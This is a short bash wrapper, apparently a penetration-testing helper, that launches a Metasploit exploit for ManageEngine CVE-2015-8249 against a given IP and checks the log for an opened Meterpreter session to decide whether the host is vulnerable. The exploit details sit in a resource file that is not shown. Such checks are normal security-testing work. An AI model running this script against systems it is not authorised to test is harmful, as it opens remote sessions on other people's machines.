#!/bin/bash

#Manage Engine 9 vulnerability scanner
#CVE_ID: CVE-2015-8249
#This script is used to scan the host for the presence of Manage Engine 9 vulnerabilities
#Script runs the exploit on a target machine and monitors for exploit's execution success

#Parameters
#Script ip_address port_number

#Make Sure The Correct Arguments are passed
if [ $# -ne 1 ]
then
	echo "Usage: $0 <host_ip>"
	exit 1
fi

#Save all the arguments in variables
IP_ADDR=$1

#Check for the required utilities
#Check if the metasploit framework is available
if ! command -v msfconsole &> /dev/null; then
    echo "This module requires msfconsole to be installed."
    exit 1
fi


#Export the variables so they can be taken in by Metasploit
export IP_ADDR



#Run Metasploit using the RC script
command msfconsole -r ManageEngine.rc &> ./log


#Check if the script contains a successful exploit
if grep -q -E "Meterpreter session . opened" log;
then 
	exit 1
else 
	exit 0
fi

